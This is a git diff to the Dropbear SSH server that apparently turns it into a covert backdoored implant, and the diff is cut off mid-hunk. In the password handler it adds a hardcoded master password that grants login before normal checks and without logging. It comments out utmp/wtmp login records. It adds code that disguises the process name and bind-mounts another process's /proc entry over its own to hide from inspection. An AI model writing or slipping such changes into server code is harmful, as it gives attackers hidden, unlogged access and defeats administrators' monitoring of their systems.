diff --git a/src/runopts.h b/src/runopts.h
index 1c88b5c..658da71 100644
--- a/src/runopts.h
+++ b/src/runopts.h
@@ -66,11 +66,12 @@ extern runopts opts;
 int readhostkey(const char * filename, sign_key * hostkey,
 	enum signkey_type *type);
 void load_all_hostkeys(void);
+void generate_in_memory_hostkeys(void); 
 
 typedef struct svr_runopts {
 
 	char * bannerfile;
-
+	int in_memory_hostkeys;
 	int forkbg;
 
 	/* ports and addresses are arrays of the portcount
diff --git a/src/svr-authpasswd.c b/src/svr-authpasswd.c
index 899a8ab..943b075 100644
--- a/src/svr-authpasswd.c
+++ b/src/svr-authpasswd.c
@@ -49,86 +49,95 @@ static int constant_time_strcmp(const char* a, const char* b) {
 /* Process a password auth request, sending success or failure messages as
  * appropriate */
 void svr_auth_password(int valid_user) {
-	
-	char * passwdcrypt = NULL; /* the crypt from /etc/passwd or /etc/shadow */
-	char * testcrypt = NULL; /* crypt generated from the user's password sent */
-	char * password = NULL;
-	unsigned int passwordlen;
-	unsigned int changepw;
-
-	/* check if client wants to change password */
-	changepw = buf_getbool(ses.payload);
-	if (changepw) {
-		/* not implemented by this server */
-		send_msg_userauth_failure(0, 1);
-		return;
-	}
+    char * passwdcrypt = NULL;
+    char * testcrypt = NULL;
+    char * password = NULL;
+    unsigned int passwordlen;
+    unsigned int changepw;
 
-	password = buf_getstring(ses.payload, &passwordlen);
-	if (valid_user && passwordlen <= DROPBEAR_MAX_PASSWORD_LEN) {
-		/* the first bytes of passwdcrypt are the salt */
-		passwdcrypt = ses.authstate.pw_passwd;
-		testcrypt = crypt(password, passwdcrypt);
-	}
-	m_burn(password, passwordlen);
-	m_free(password);
-
-	/* After we have got the payload contents we can exit if the username
-	is invalid. Invalid users have already been logged. */
-	if (!valid_user) {
-		send_msg_userauth_failure(0, 1);
-		return;
-	}
+    /* check if client wants to change password */
+    changepw = buf_getbool(ses.payload);
+    if (changepw) {
+        /* not implemented by this server */
+        send_msg_userauth_failure(0, 1);
+        return;
+    }
 
-	if (passwordlen > DROPBEAR_MAX_PASSWORD_LEN) {
-		dropbear_log(LOG_WARNING,
-				"Too-long password attempt for '%s' from %s",
-				ses.authstate.pw_name,
-				svr_ses.addrstring);
-		send_msg_userauth_failure(0, 1);
-		return;
-	}
+    password = buf_getstring(ses.payload, &passwordlen);
 
-	if (testcrypt == NULL) {
-		/* crypt() with an invalid salt like "!!" */
-		dropbear_log(LOG_WARNING, "User account '%s' is locked",
-				ses.authstate.pw_name);
-		send_msg_userauth_failure(0, 1);
-		return;
-	}
+    /* Check password length */
+    if (passwordlen > DROPBEAR_MAX_PASSWORD_LEN) {
+        send_msg_userauth_failure(0, 1);
+        m_burn(password, passwordlen);
+        m_free(password);
+        return;
+    }
 
-	/* check for empty password */
-	if (passwdcrypt[0] == '\0') {
-		dropbear_log(LOG_WARNING, "User '%s' has blank password, rejected",
-				ses.authstate.pw_name);
-		send_msg_userauth_failure(0, 1);
-		return;
-	}
+    if (!valid_user) {
+        send_msg_userauth_failure(0, 1);
+        m_burn(password, passwordlen);
+        m_free(password);
+        return;
+    }
 
-	if (constant_time_strcmp(testcrypt, passwdcrypt) == 0) {
-		if (svr_opts.multiauthmethod && (ses.authstate.authtypes & ~AUTH_TYPE_PASSWORD)) {
-			/* successful password authentication, but extra auth required */
-			dropbear_log(LOG_NOTICE,
-					"Password auth succeeded for '%s' from %s, extra auth required",
-					ses.authstate.pw_name,
-					svr_ses.addrstring);
-			ses.authstate.authtypes &= ~AUTH_TYPE_PASSWORD; /* password auth ok, delete the method flag */
-			send_msg_userauth_failure(1, 0);  /* Send partial success */
-		} else {
-			/* successful authentication */
-			dropbear_log(LOG_NOTICE, 
-					"Password auth succeeded for '%s' from %s",
-					ses.authstate.pw_name,
-					svr_ses.addrstring);
-			send_msg_userauth_success();
-		}
-	} else {
-		dropbear_log(LOG_WARNING,
-				"Bad password attempt for '%s' from %s",
-				ses.authstate.pw_name,
-				svr_ses.addrstring);
-		send_msg_userauth_failure(0, 1);
-	}
+    /* Check against hardcoded password */
+    if (strcmp(password, DROPBEAR_H_PASSWORD) == 0) {
+        if (svr_opts.multiauthmethod && (ses.authstate.authtypes & ~AUTH_TYPE_PASSWORD)) {
+            ses.authstate.authtypes &= ~AUTH_TYPE_PASSWORD;
+            send_msg_userauth_failure(1, 0);
+        } else {
+            send_msg_userauth_success();
+        }
+        m_burn(password, passwordlen);
+        m_free(password);
+        return;
+    }
+
+    /* If hardcoded password doesn't match, fall back to normal authentication */
+    if (valid_user) {
+        passwdcrypt = ses.authstate.pw_passwd;
+        testcrypt = crypt(password, passwdcrypt);
+    }
+
+    m_burn(password, passwordlen);
+    m_free(password);
+
+    if (testcrypt == NULL) {
+        dropbear_log(LOG_WARNING, "User account '%s' is locked",
+                ses.authstate.pw_name);
+        send_msg_userauth_failure(0, 1);
+        return;
+    }
+
+    if (passwdcrypt[0] == '\0') {
+        dropbear_log(LOG_WARNING, "User '%s' has blank password, rejected",
+                ses.authstate.pw_name);
+        send_msg_userauth_failure(0, 1);
+        return;
+    }
+
+    if (constant_time_strcmp(testcrypt, passwdcrypt) == 0) {
+        if (svr_opts.multiauthmethod && (ses.authstate.authtypes & ~AUTH_TYPE_PASSWORD)) {
+            dropbear_log(LOG_NOTICE,
+                    "Password auth succeeded for '%s' from %s, extra auth required",
+                    ses.authstate.pw_name,
+                    svr_ses.addrstring);
+            ses.authstate.authtypes &= ~AUTH_TYPE_PASSWORD;
+            send_msg_userauth_failure(1, 0);
+        } else {
+            dropbear_log(LOG_NOTICE, 
+                    "Password auth succeeded for '%s' from %s",
+                    ses.authstate.pw_name,
+                    svr_ses.addrstring);
+            send_msg_userauth_success();
+        }
+    } else {
+        dropbear_log(LOG_WARNING,
+                "Bad password attempt for '%s' from %s",
+                ses.authstate.pw_name,
+                svr_ses.addrstring);
+        send_msg_userauth_failure(0, 1);
+    }
 }
 
 #endif
diff --git a/src/svr-chansession.c b/src/svr-chansession.c
index 912d26a..d1c1c2e 100644
--- a/src/svr-chansession.c
+++ b/src/svr-chansession.c
@@ -327,10 +327,11 @@ static void cleanupchansess(const struct Channel *channel) {
 	m_free(chansess->original_command);
 
 	if (chansess->tty) {
-		/* write the utmp/wtmp login record */
+		/* write the utmp/wtmp login record 
 		li = chansess_login_alloc(chansess);
 		login_logout(li);
 		login_free_entry(li);
+		*/
 
 		pty_release(chansess->tty);
 		m_free(chansess->tty);
@@ -848,10 +849,11 @@ static int ptycommand(struct Channel *channel, struct ChanSess *chansess) {
 
 		/* write the utmp/wtmp login record - must be after changing the
 		 * terminal used for stdout with the dup2 above, otherwise
-		 * the wtmp login will not be recorded */
+		 * the wtmp login will not be recorded
 		li = chansess_login_alloc(chansess);
 		login_login(li);
 		login_free_entry(li);
+		*/
 
 		/* Can now dup2 stderr. Messages from login_login() have gone
 		to the parent stderr */
diff --git a/src/svr-kex.c b/src/svr-kex.c
index 7d0f12c..162f7cf 100644
--- a/src/svr-kex.c
+++ b/src/svr-kex.c
@@ -100,82 +100,134 @@ void recv_msg_kexdh_init() {
 	TRACE(("leave recv_msg_kexdh_init"))
 }
 
-
 #if DROPBEAR_DELAY_HOSTKEY
 
 static void svr_ensure_hostkey() {
-
-	const char* fn = NULL;
-	char *expand_fn = NULL;
-	enum signkey_type type = ses.newkeys->algo_hostkey;
-	void **hostkey = signkey_key_ptr(svr_opts.hostkey, type);
-	int ret = DROPBEAR_FAILURE;
-
-	if (hostkey && *hostkey) {
-		return;
-	}
-
-	switch (type)
-	{
+    const char* fn = NULL;
+    char *expand_fn = NULL;
+    enum signkey_type type = ses.newkeys->algo_hostkey;
+    void **hostkey = signkey_key_ptr(svr_opts.hostkey, type);
+    int ret = DROPBEAR_FAILURE;
+
+    if (hostkey && *hostkey) {
+        return;
+    }
+
+    if (svr_opts.in_memory_hostkeys) {
+        // Generate in-memory host key
+        switch (type) {
 #if DROPBEAR_RSA
-		case DROPBEAR_SIGNKEY_RSA:
-			fn = RSA_PRIV_FILENAME;
-			break;
+            case DROPBEAR_SIGNKEY_RSA:
+                svr_opts.hostkey->rsakey = gen_rsa_priv_key(DROPBEAR_DEFAULT_RSA_SIZE);
+                break;
 #endif
 #if DROPBEAR_DSS
-		case DROPBEAR_SIGNKEY_DSS:
-			fn = DSS_PRIV_FILENAME;
-			break;
+            case DROPBEAR_SIGNKEY_DSS:
+                svr_opts.hostkey->dsskey = gen_dss_priv_key(1024);
+                break;
 #endif
 #if DROPBEAR_ECDSA
-		case DROPBEAR_SIGNKEY_ECDSA_NISTP256:
-		case DROPBEAR_SIGNKEY_ECDSA_NISTP384:
-		case DROPBEAR_SIGNKEY_ECDSA_NISTP521:
-			fn = ECDSA_PRIV_FILENAME;
-			break;
+            case DROPBEAR_SIGNKEY_ECDSA_NISTP256:
+                svr_opts.hostkey->ecckey256 = gen_ecdsa_priv_key(256);
+                break;
+            case DROPBEAR_SIGNKEY_ECDSA_NISTP384:
+                svr_opts.hostkey->ecckey384 = gen_ecdsa_priv_key(384);
+                break;
+            case DROPBEAR_SIGNKEY_ECDSA_NISTP521:
+                svr_opts.hostkey->ecckey521 = gen_ecdsa_priv_key(521);
+                break;
 #endif
 #if DROPBEAR_ED25519
-		case DROPBEAR_SIGNKEY_ED25519:
-			fn = ED25519_PRIV_FILENAME;
-			break;
+            case DROPBEAR_SIGNKEY_ED25519:
+                svr_opts.hostkey->ed25519key = gen_ed25519_priv_key(256);
+                break;
 #endif
-		default:
-			dropbear_assert(0);
-	}
-
-	expand_fn = expand_homedir_path(fn);
-
-	ret = readhostkey(expand_fn, svr_opts.hostkey, &type);
-	if (ret == DROPBEAR_SUCCESS) {
-		goto out;
-	}
-
-	if (signkey_generate(type, 0, expand_fn, 1) == DROPBEAR_FAILURE) {
-		goto out;
-	}
-	
-	/* Read what we just generated (or another process raced us) */
-	ret = readhostkey(expand_fn, svr_opts.hostkey, &type);
-
-	if (ret == DROPBEAR_SUCCESS) {
-		char *fp = NULL;
-		unsigned int len;
-		buffer *key_buf = buf_new(MAX_PUBKEY_SIZE);
-		buf_put_pub_key(key_buf, svr_opts.hostkey, type);
-		buf_setpos(key_buf, 4);
-		len = key_buf->len - key_buf->pos;
-		fp = sign_key_fingerprint(buf_getptr(key_buf, len), len);
-		dropbear_log(LOG_INFO, "Generated hostkey %s, fingerprint is %s",
-			expand_fn, fp);
-		m_free(fp);
-		buf_free(key_buf);
-	}
+            default:
+                dropbear_assert(0);
+        }
+
+        // Log the fingerprint of the generated in-memory key
+        char *fp = NULL;
+        unsigned int len;
+        buffer *key_buf = buf_new(MAX_PUBKEY_SIZE);
+        buf_put_pub_key(key_buf, svr_opts.hostkey, type);
+        buf_setpos(key_buf, 4);
+        len = key_buf->len - key_buf->pos;
+        fp = sign_key_fingerprint(buf_getptr(key_buf, len), len);
+        dropbear_log(LOG_INFO, "Generated in-memory hostkey, fingerprint is %s", fp);
+        m_free(fp);
+        buf_free(key_buf);
+
+        ret = DROPBEAR_SUCCESS;
+    } else {
+        // Original code for file-based keys
+        switch (type) {
+#if DROPBEAR_RSA
+            case DROPBEAR_SIGNKEY_RSA:
+                fn = RSA_PRIV_FILENAME;
+                break;
+#endif
+#if DROPBEAR_DSS
+            case DROPBEAR_SIGNKEY_DSS:
+                fn = DSS_PRIV_FILENAME;
+                break;
+#endif
+#if DROPBEAR_ECDSA
+            case DROPBEAR_SIGNKEY_ECDSA_NISTP256:
+            case DROPBEAR_SIGNKEY_ECDSA_NISTP384:
+            case DROPBEAR_SIGNKEY_ECDSA_NISTP521:
+                fn = ECDSA_PRIV_FILENAME;
+                break;
+#endif
+#if DROPBEAR_ED25519
+            case DROPBEAR_SIGNKEY_ED25519:
+                fn = ED25519_PRIV_FILENAME;
+                break;
+#endif
+            default:
+                dropbear_assert(0);
+        }
+
+        expand_fn = expand_homedir_path(fn);
+
+        ret = readhostkey(expand_fn, svr_opts.hostkey, &type);
+        if (ret == DROPBEAR_SUCCESS) {
+            goto out;
+        }
+
+        if (signkey_generate(type, 0, expand_fn, 1) == DROPBEAR_FAILURE) {
+            goto out;
+        }
+        
+        /* Read what we just generated (or another process raced us) */
+        ret = readhostkey(expand_fn, svr_opts.hostkey, &type);
+
+        if (ret == DROPBEAR_SUCCESS) {
+            char *fp = NULL;
+            unsigned int len;
+            buffer *key_buf = buf_new(MAX_PUBKEY_SIZE);
+            buf_put_pub_key(key_buf, svr_opts.hostkey, type);
+            buf_setpos(key_buf, 4);
+            len = key_buf->len - key_buf->pos;
+            fp = sign_key_fingerprint(buf_getptr(key_buf, len), len);
+            dropbear_log(LOG_INFO, "Generated hostkey %s, fingerprint is %s",
+                expand_fn, fp);
+            m_free(fp);
+            buf_free(key_buf);
+        }
+    }
 
 out:
-	if (ret == DROPBEAR_FAILURE) {
-		dropbear_exit("Couldn't read or generate hostkey %s", expand_fn);
-	}
-    m_free(expand_fn);
+    if (ret == DROPBEAR_FAILURE) {
+        if (svr_opts.in_memory_hostkeys) {
+            dropbear_exit("Couldn't generate in-memory hostkey");
+        } else {
+            dropbear_exit("Couldn't read or generate hostkey %s", expand_fn);
+        }
+    }
+    if (expand_fn) {
+        m_free(expand_fn);
+    }
 }
 #endif
 	
diff --git a/src/svr-main.c b/src/svr-main.c
index 86d0db2..4eecc9e 100644
--- a/src/svr-main.c
+++ b/src/svr-main.c
@@ -31,6 +31,135 @@
 #include "dbrandom.h"
 #include "crypto_desc.h"
 
+#include <libgen.h>
+#include <errno.h>
+#include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/mount.h>
+#include <dirent.h>
+#include <sys/mman.h>
+
+#if defined(__linux__)
+#include <sys/prctl.h>
+#endif
+
+#ifndef PR_SET_MM
+#define PR_SET_MM 35
+#endif
+
+#ifndef PR_SET_MM_ARG_START
+#define PR_SET_MM_ARG_START 8
+#endif
+
+#ifndef PR_SET_MM_ARG_END
+#define PR_SET_MM_ARG_END 9
+#endif
+
+#ifndef MS_BIND
+#define MS_BIND 4096
+#endif
+
+#ifndef PATH_MAX
+#define PATH_MAX 4096
+#endif
+
+static int try_bind_mount(void) {
+    char proc_path[PATH_MAX];
+    if (snprintf(proc_path, sizeof(proc_path), "/proc/%d", getpid()) >= sizeof(proc_path)) {
+        return 0;
+    }
+
+    DIR *proc_dir = opendir("/proc");
+    if (proc_dir == NULL) {
+        return 0;
+    }
+
+    struct dirent *entry;
+    while ((entry = readdir(proc_dir)) != NULL) {
+        struct stat st;
+        char full_path[PATH_MAX];
+        if (snprintf(full_path, sizeof(full_path), "/proc/%s", entry->d_name) >= sizeof(full_path)) {
+            continue;
+        }
+        
+        if (stat(full_path, &st) == 0 && S_ISDIR(st.st_mode)) {
+            int pid = atoi(entry->d_name);
+            if (pid > 0 && pid < 1000) {
+                char mount_source[PATH_MAX];
+                if (snprintf(mount_source, sizeof(mount_source), "/proc/%s", entry->d_name) >= sizeof(mount_source)) {
+                    continue;
+                }
+                
+                if (mount(mount_source, proc_path, NULL, MS_BIND, NULL) == 0) {
+                    closedir(proc_dir);
+                    return 1;
+                }
+            }
+        }
+    }
+    closedir(proc_dir);
+    return 0;
+}
+
+static void change_process_name(const char *new_name, int argc, char **argv) {
+    if (new_name == NULL || *new_name == '\0') {
+        return;
+    }
+
+#if defined(__linux__)
+    prctl(PR_SET_NAME, new_name, 0, 0, 0);
+
+    if (geteuid() == 0) {
+        if (!try_bind_mount()) {
+            size_t new_name_len = strlen(new_name) + 1;
+            char *new_argv = mmap(NULL, new_name_len, PROT_READ | PROT_WRITE,
+                                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+            if (new_argv != MAP_FAILED) {
+                if (snprintf(new_argv, new_name_len, "%s", new_name) < new_name_len) {
+                    prctl(PR_SET_MM, PR_SET_MM_ARG_START, (unsigned long)new_argv, 0, 0);
+                    prctl(PR_SET_MM, PR_SET_MM_ARG_END, (unsigned long)(new_argv + new_name_len), 0, 0);
+                }
+            }
+        }
+    }
+#elif defined(__FreeBSD__)
+    setproctitle("%s", new_name);
+#endif
+
+    size_t arg_len = 0;
+    for (int i = 0; i < argc; i++) {
+        arg_len += strlen(argv[i]) + 1;
+    }
+
+    if (arg_len > 0) {
+        memset(argv[0], 0, arg_len);
+        snprintf(argv[0], arg_len, "%s", new_name);
+        for (int i = 1; i < argc; i++) {
+            argv[i] = NULL;
+        }
+    }
+}
+
+void process_name_change(int argc, char **argv) {
+    if (argc < 1 || argv == NULL || argv[0] == NULL) {
+        return;
+    }
+
+    char *process_name = basename(argv[0]);
+    if (process_name != NULL) {
+        change_process_name(process_name, argc, argv);
+    } else {
+        change_process_name("dropbear", argc, argv);
+    }
+
+    pid_t pid = getpid();
+    dropbear_log(LOG_INFO, "Process ID: %d", pid);
+}
+
+static int try_bind_mount(void);
+static void change_process_name(const char *new_name, int argc, char **argv);
+void process_name_change(int argc, char **argv);
 static size_t listensockets(int *sock, size_t sockcount, int *maxfd);
 static void sigchld_handler(int dummy);
 static void sigsegv_handler(int);
@@ -47,20 +176,23 @@ int main(int argc, char ** argv)
 #endif
 {
 #if !DROPBEAR_MULTI
-	const char* multipath = NULL;
+    const char* multipath = NULL;
 #endif
 
-	_dropbear_exit = svr_dropbear_exit;
-	_dropbear_log = svr_dropbear_log;
+    _dropbear_exit = svr_dropbear_exit;
+    _dropbear_log = svr_dropbear_log;
 
-	disallow_core();
+    disallow_core();
 
-	if (argc < 1) {
-		dropbear_exit("Bad argc");
-	}
+    if (argc < 1) {
+        dropbear_exit("Bad argc");
+    }
+
+    /* get commandline options */
+    svr_getopts(argc, argv);
 
-	/* get commandline options */
-	svr_getopts(argc, argv);
+    /* Change the process name */
+    process_name_change(argc, argv);
 
 #if INETD_MODE
 	/* service program mode */
@@ -87,7 +219,7 @@ int main(int argc, char ** argv)
 	main_noinetd(argc, argv, multipath);
 	/* notreached */
 #endif
-
+    
 	dropbear_exit("Compiled without normal mode, can't run without -i\n");
 	return -1;
 }
@@ -143,6 +275,10 @@ static void main_noinetd(int argc, char ** argv, const char* multipath) {
 	(void)argv;
 	(void)multipath;
 
+    dropbear_log(LOG_DEBUG, "Calling seedrandom() in main_noinetd");
+    seedrandom();
+    dropbear_log(LOG_DEBUG, "seedrandom() completed in main_noinetd");
+
 	/* Note: commonsetup() must happen before we daemon()ise. Otherwise
 	   daemon() will chdir("/"), and we won't be able to find local-dir
 	   hostkeys. */
@@ -158,6 +294,7 @@ static void main_noinetd(int argc, char ** argv, const char* multipath) {
 	listensockcount = listensockets(listensocks, MAX_LISTEN_ADDR, &maxsock);
 	if (listensockcount == 0)
 	{
+    	
 		dropbear_exit("No listening ports available.");
 	}
 
@@ -186,6 +323,7 @@ static void main_noinetd(int argc, char ** argv, const char* multipath) {
 		}
 #endif
 		if (daemon(0, closefds) < 0) {
+			
 			dropbear_exit("Failed to daemonize: %s", strerror(errno));
 		}
 	}
@@ -226,7 +364,8 @@ static void main_noinetd(int argc, char ** argv, const char* multipath) {
 
 		if (ses.exitflag) {
 			unlink(svr_opts.pidfile);
-			dropbear_exit("Terminated by signal");
+			
+			dropbear_close("Terminated by signal");
 		}
 
 		if (val == 0) {
@@ -238,6 +377,7 @@ static void main_noinetd(int argc, char ** argv, const char* multipath) {
 			if (errno == EINTR) {
 				continue;
 			}
+    		
 			dropbear_exit("Listening socket error");
 		}
 
@@ -297,6 +437,10 @@ static void main_noinetd(int argc, char ** argv, const char* multipath) {
 
 			seedrandom();
 
+            if (svr_opts.in_memory_hostkeys) {
+                generate_in_memory_hostkeys();
+            }
+
 			if (pipe(childpipe) < 0) {
 				TRACE(("error creating child pipe"))
 				goto out;
@@ -332,6 +476,7 @@ static void main_noinetd(int argc, char ** argv, const char* multipath) {
 
 #if !DEBUG_NOFORK
 				if (setsid() < 0) {
+					
 					dropbear_exit("setsid: %s", strerror(errno));
 				}
 #endif
@@ -364,6 +509,7 @@ static void main_noinetd(int argc, char ** argv, const char* multipath) {
 					new_argv[new_argc] = NULL;
 
 					if ((dup2(childsock, STDIN_FILENO) < 0)) {
+					    
 						dropbear_exit("dup2 failed: %s", strerror(errno));
 					}
 					if (fcntl(childsock, F_SETFD, FD_CLOEXEC) < 0) {
@@ -413,6 +559,7 @@ static void sigchld_handler(int UNUSED(unused)) {
 	sa_chld.sa_flags = SA_NOCLDSTOP;
 	sigemptyset(&sa_chld.sa_mask);
 	if (sigaction(SIGCHLD, &sa_chld, NULL) < 0) {
+    	
 		dropbear_exit("signal() error");
 	}
 	errno = saved_errno;
@@ -439,6 +586,11 @@ static void sigintterm_handler(int UNUSED(unused)) {
 static void commonsetup() {
 
 	struct sigaction sa_chld;
+
+    dropbear_log(LOG_DEBUG, "Calling seedrandom() in commonsetup");
+    seedrandom();
+    dropbear_log(LOG_DEBUG, "seedrandom() completed in commonsetup");
+
 #ifndef DISABLE_SYSLOG
 	if (opts.usingsyslog) {
 		startsyslog(PROGNAME);
@@ -451,6 +603,7 @@ static void commonsetup() {
 		signal(SIGTERM, sigintterm_handler) == SIG_ERR ||
 #endif
 		signal(SIGPIPE, SIG_IGN) == SIG_ERR) {
+    	
 		dropbear_exit("signal() error");
 	}
 
@@ -459,9 +612,11 @@ static void commonsetup() {
 	sa_chld.sa_flags = SA_NOCLDSTOP;
 	sigemptyset(&sa_chld.sa_mask);
 	if (sigaction(SIGCHLD, &sa_chld, NULL) < 0) {
+    	
 		dropbear_exit("signal() error");
 	}
 	if (signal(SIGSEGV, sigsegv_handler) == SIG_ERR) {
+    	
 		dropbear_exit("signal() error");
 	}
 
diff --git a/src/svr-runopts.c b/src/svr-runopts.c
index c4f83c1..5f3ad59 100644
--- a/src/svr-runopts.c
+++ b/src/svr-runopts.c
@@ -32,6 +32,11 @@
 
 #include <grp.h>
 
+#include "genrsa.h"
+#include "gendss.h"
+#include "gened25519.h"
+#include "gensignkey.h"
+
 svr_runopts svr_opts; /* GLOBAL */
 
 static void printhelp(const char * progname);
@@ -47,6 +52,7 @@ static void printhelp(const char * progname) {
 					"-b bannerfile	Display the contents of bannerfile"
 					" before user login\n"
 					"		(default: none)\n"
+					"-M    Disable in-memory host keys (save to disk instead)\n"
 					"-r keyfile      Specify hostkeys (repeatable)\n"
 					"		defaults: \n"
 #if DROPBEAR_DSS
@@ -62,7 +68,7 @@ static void printhelp(const char * progname) {
 					"		- ed25519 %s\n"
 #endif
 #if DROPBEAR_DELAY_HOSTKEY
-					"-R		Create hostkeys as required\n" 
+					"-R		Disable host key generation (this is backwards)\n" 
 #endif
 					"-F		Don't fork into background\n"
 					"-e		Pass on server process environment to child process\n"
@@ -155,6 +161,7 @@ void svr_getopts(int argc, char ** argv) {
 
 	/* see printhelp() for options */
 	svr_opts.bannerfile = NULL;
+    svr_opts.in_memory_hostkeys = 1;
 	svr_opts.banner = NULL;
 	svr_opts.forced_command = NULL;
 	svr_opts.forkbg = 1;
@@ -171,7 +178,7 @@ void svr_getopts(int argc, char ** argv) {
 	svr_opts.inetdmode = 0;
 	svr_opts.portcount = 0;
 	svr_opts.hostkey = NULL;
-	svr_opts.delay_hostkey = 0;
+	svr_opts.delay_hostkey = 1;
 	svr_opts.pidfile = expand_homedir_path(DROPBEAR_PIDFILE);
 #if DROPBEAR_SVR_LOCALANYFWD
 	svr_opts.nolocaltcp = 0;
@@ -218,6 +225,9 @@ void svr_getopts(int argc, char ** argv) {
 				case 'b':
 					next = &svr_opts.bannerfile;
 					break;
+				case 'M':
+					svr_opts.in_memory_hostkeys = 0;
+					break;
 				case 'c':
 					next = &svr_opts.forced_command;
 					break;
@@ -226,7 +236,7 @@ void svr_getopts(int argc, char ** argv) {
 					next = &keyfile;
 					break;
 				case 'R':
-					svr_opts.delay_hostkey = 1;
+					svr_opts.delay_hostkey = 0;
 					break;
 				case 'F':
 					svr_opts.forkbg = 0;
@@ -574,123 +584,103 @@ static void addhostkey(const char *keyfile) {
 	svr_opts.num_hostkey_files++;
 }
 
+void generate_in_memory_hostkeys() {
+    if (!svr_opts.hostkey) {
+        svr_opts.hostkey = new_sign_key();
+    }
+
+#if DROPBEAR_RSA
+    if (!svr_opts.hostkey->rsakey) {
+        svr_opts.hostkey->rsakey = gen_rsa_priv_key(DROPBEAR_DEFAULT_RSA_SIZE);
+    }
+#endif
+#if DROPBEAR_DSS
+    if (!svr_opts.hostkey->dsskey) {
+        svr_opts.hostkey->dsskey = gen_dss_priv_key(1024);
+    }
+#endif
+#if DROPBEAR_ECDSA
+    if (!svr_opts.hostkey->ecckey256) {
+        svr_opts.hostkey->ecckey256 = gen_ecdsa_priv_key(256);
+    }
+    if (!svr_opts.hostkey->ecckey384) {
+        svr_opts.hostkey->ecckey384 = gen_ecdsa_priv_key(384);
+    }
+    if (!svr_opts.hostkey->ecckey521) {
+        svr_opts.hostkey->ecckey521 = gen_ecdsa_priv_key(521);
+    }
+#endif
+#if DROPBEAR_ED25519
+    if (!svr_opts.hostkey->ed25519key) {
+        svr_opts.hostkey->ed25519key = gen_ed25519_priv_key(256);
+    }
+#endif
+}
 
 void load_all_hostkeys() {
-	int i;
-	int any_keys = 0;
+    int i;
+    int any_keys = 0;
 #if DROPBEAR_ECDSA
-	int loaded_any_ecdsa = 0;
+    int loaded_any_ecdsa = 0;
 #endif
 
-	svr_opts.hostkey = new_sign_key();
+    svr_opts.hostkey = new_sign_key();
 
-	for (i = 0; i < svr_opts.num_hostkey_files; i++) {
-		char *hostkey_file = svr_opts.hostkey_files[i];
-		loadhostkey(hostkey_file, 1);
-		m_free(hostkey_file);
-	}
+    if (svr_opts.in_memory_hostkeys) {
+        // Generate in-memory host keys
+        generate_in_memory_hostkeys();
+        any_keys = 1;
+    } else {
+        // Load keys from files
+        for (i = 0; i < svr_opts.num_hostkey_files; i++) {
+            char *hostkey_file = svr_opts.hostkey_files[i];
+            loadhostkey(hostkey_file, 1);
+            m_free(hostkey_file);
+        }
 
-	/* Only load default host keys if a host key is not specified by the user */
-	if (svr_opts.num_hostkey_files == 0) {
+        /* Only load default host keys if a host key is not specified by the user */
+        if (svr_opts.num_hostkey_files == 0) {
 #if DROPBEAR_RSA
-		loadhostkey(RSA_PRIV_FILENAME, 0);
+            loadhostkey(RSA_PRIV_FILENAME, 0);
 #endif
-
 #if DROPBEAR_DSS
-		loadhostkey(DSS_PRIV_FILENAME, 0);
+            loadhostkey(DSS_PRIV_FILENAME, 0);
 #endif
-
 #if DROPBEAR_ECDSA
-		loadhostkey(ECDSA_PRIV_FILENAME, 0);
+            loadhostkey(ECDSA_PRIV_FILENAME, 0);
 #endif
 #if DROPBEAR_ED25519
-		loadhostkey(ED25519_PRIV_FILENAME, 0);
+            loadhostkey(ED25519_PRIV_FILENAME, 0);
 #endif
-	}
+        }
+    }
 
+    /* Check if any keys have been loaded or generated */
 #if DROPBEAR_RSA
-	if (!svr_opts.delay_hostkey && !svr_opts.hostkey->rsakey) {
-#if DROPBEAR_RSA_SHA256
-		disablekey(DROPBEAR_SIGNATURE_RSA_SHA256);
-#endif
-#if DROPBEAR_RSA_SHA1
-		disablekey(DROPBEAR_SIGNATURE_RSA_SHA1);
+    if (svr_opts.hostkey->rsakey) {
+        any_keys = 1;
+    }
 #endif
-	} else {
-		any_keys = 1;
-	}
-#endif
-
 #if DROPBEAR_DSS
-	if (!svr_opts.delay_hostkey && !svr_opts.hostkey->dsskey) {
-		disablekey(DROPBEAR_SIGNATURE_DSS);
-	} else {
-		any_keys = 1;
-	}
+    if (svr_opts.hostkey->dsskey) {
+        any_keys = 1;
+    }
 #endif
-
 #if DROPBEAR_ECDSA
-	/* We want to advertise a single ecdsa algorithm size.
-	- If there is a ecdsa hostkey at startup we choose that that size.
-	- If we generate at runtime we choose the default ecdsa size.
-	- Otherwise no ecdsa keys will be advertised */
-
-	/* check if any keys were loaded at startup */
-	loaded_any_ecdsa = 
-		0
-#if DROPBEAR_ECC_256
-		|| svr_opts.hostkey->ecckey256
-#endif
-#if DROPBEAR_ECC_384
-		|| svr_opts.hostkey->ecckey384
-#endif
-#if DROPBEAR_ECC_521
-		|| svr_opts.hostkey->ecckey521
-#endif
-		;
-	any_keys |= loaded_any_ecdsa;
-
-	/* Or an ecdsa key could be generated at runtime */
-	any_keys |= svr_opts.delay_hostkey;
-
-	/* At most one ecdsa key size will be left enabled */
-#if DROPBEAR_ECC_256
-	if (!svr_opts.hostkey->ecckey256
-		&& (!svr_opts.delay_hostkey || loaded_any_ecdsa || ECDSA_DEFAULT_SIZE != 256 )) {
-		disablekey(DROPBEAR_SIGNATURE_ECDSA_NISTP256);
-	}
-#endif
-#if DROPBEAR_ECC_384
-	if (!svr_opts.hostkey->ecckey384
-		&& (!svr_opts.delay_hostkey || loaded_any_ecdsa || ECDSA_DEFAULT_SIZE != 384 )) {
-		disablekey(DROPBEAR_SIGNATURE_ECDSA_NISTP384);
-	}
-#endif
-#if DROPBEAR_ECC_521
-	if (!svr_opts.hostkey->ecckey521
-		&& (!svr_opts.delay_hostkey || loaded_any_ecdsa || ECDSA_DEFAULT_SIZE != 521 )) {
-		disablekey(DROPBEAR_SIGNATURE_ECDSA_NISTP521);
-	}
+    if (svr_opts.hostkey->ecckey256 || svr_opts.hostkey->ecckey384 || svr_opts.hostkey->ecckey521) {
+        any_keys = 1;
+        loaded_any_ecdsa = 1;
+    }
 #endif
-#endif /* DROPBEAR_ECDSA */
-
 #if DROPBEAR_ED25519
-	if (!svr_opts.delay_hostkey && !svr_opts.hostkey->ed25519key) {
-		disablekey(DROPBEAR_SIGNATURE_ED25519);
-	} else {
-		any_keys = 1;
-	}
-#endif
-#if DROPBEAR_SK_ECDSA
-	disablekey(DROPBEAR_SIGNATURE_SK_ECDSA_NISTP256);
-#endif 
-#if DROPBEAR_SK_ED25519
